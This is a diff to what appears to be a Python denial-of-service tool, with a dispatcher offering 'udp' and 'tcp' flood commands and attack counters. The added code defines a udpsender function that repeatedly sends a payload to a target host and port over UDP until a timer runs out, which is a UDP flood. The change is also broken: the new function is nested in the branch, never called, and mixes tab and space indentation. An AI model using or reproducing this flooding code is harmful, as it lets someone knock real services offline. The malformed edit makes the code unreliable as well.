@@ -1033,11 +1033,22 @@ def command():
         timer.start()
         timer.join()
     elif command == "udp" or command == "UDP":
-        target, port, thread, t = get_info_l4()
-        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
+        def udpsender(host, port, timer, punch):
+	global uaid
+	global udp
+	global aid
+	global tattacks
+
+	timeout = time.time() + float(timer)
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	
+	uaid += 1
+	aid += 1
+	tattacks += 1
+	while time.time() < timeout and udp and attack:
+		sock.sendto(punch, (host, int(port)))
+	uaid -= 1
+	aid -= 1
     elif command == "tcp" or command == "TCP":
         target, port, thread, t = get_info_l4()
         threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
